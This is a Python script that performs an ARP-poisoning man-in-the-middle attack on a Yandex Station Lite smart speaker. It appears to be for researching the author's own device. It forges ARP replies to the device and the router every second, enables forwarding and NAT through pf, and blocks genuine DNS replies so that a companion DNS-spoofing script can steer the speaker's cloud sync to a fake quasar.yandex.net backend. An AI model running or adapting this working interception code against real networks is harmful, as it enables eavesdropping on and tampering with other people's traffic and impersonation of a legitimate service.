#!/usr/bin/env python3
"""Scoped MITM for the Station Lite (192.168.1.65, yandexmicro) — same chain as
the Mini 2 but interception via DNS hijack (pf rdr proved fragile): poison the
Lite's gateway ARP entry + the router's Lite entry, forward+NAT everything
normally, and let dns-spoof-lite.py steer the quasar.yandex.net sync to our
fake backend on :443. Run as root."""
import json, os, subprocess, sys, time, threading
from scapy.all import conf, Ether, ARP, sendp

IFACE='en0'
LITE='192.168.1.65'
ROUTER='192.168.1.254'
MAC_ROUTER='e0:60:66:68:16:ba'
MAC_LITE='b8:87:6e:75:53:08'
MAC_SELF='32:0b:ca:bf:47:06'
HERE=os.path.dirname(os.path.abspath(__file__))
STATE=os.path.join(HERE,'state-lite.json')

PF_RULES=f"""
nat on en0 from {LITE} to any -> ({IFACE})
block drop in on en0 inet proto udp from any port 53 to {LITE}
"""

def sh(c): return subprocess.run(c, shell=True, capture_output=True, text=True)

def main():
    assert os.geteuid()==0, 'must run as root'
    print(sh('sysctl -w net.inet.ip.forwarding=1').stdout.strip())
    open(os.path.join(HERE,'pf-lite.conf'),'w').write(PF_RULES)
    print(sh(f'pfctl -f {HERE}/pf-lite.conf').stdout.strip(), sh('pfctl -e').stdout.strip())
    backend = subprocess.Popen([sys.executable, os.path.join(HERE,'fake-quasar.py'), '443'],
                               stdout=open(os.path.join(HERE,'backend-lite.out'),'w'), stderr=subprocess.STDOUT)
    with open(STATE,'w') as f: json.dump({'mitm': os.getpid(), 'backend': backend.pid}, f)
    print(f'state: backend pid {backend.pid}', flush=True)
    stop=threading.Event()
    def poison():
        # tell Lite: ROUTER is at our MAC (its traffic flows through us)
        # tell ROUTER: LITE is at our MAC (replies come back through us)
        while not stop.is_set():
            sendp(Ether(dst=MAC_LITE)/ARP(op=2, pdst=LITE, psrc=ROUTER, hwsrc=MAC_SELF), iface=IFACE, verbose=0)
            sendp(Ether(dst=MAC_ROUTER)/ARP(op=2, pdst=ROUTER, psrc=LITE, hwsrc=MAC_SELF), iface=IFACE, verbose=0)
            time.sleep(1)
    t=threading.Thread(target=poison, daemon=True); t.start()
    print('poisoning (1s interval)', flush=True)
    try:
        while True: time.sleep(5)
    finally:
        stop.set()
        sendp(Ether(dst=MAC_LITE)/ARP(op=2, pdst=LITE, psrc=ROUTER, hwsrc=MAC_ROUTER), iface=IFACE, verbose=0)
        sendp(Ether(dst=MAC_ROUTER)/ARP(op=2, pdst=ROUTER, psrc=LITE, hwsrc=MAC_LITE), iface=IFACE, verbose=0)
        sh('pfctl -d'); sh('sysctl -w net.inet.ip.forwarding=0')
        backend.terminate()

if __name__=='__main__': main()
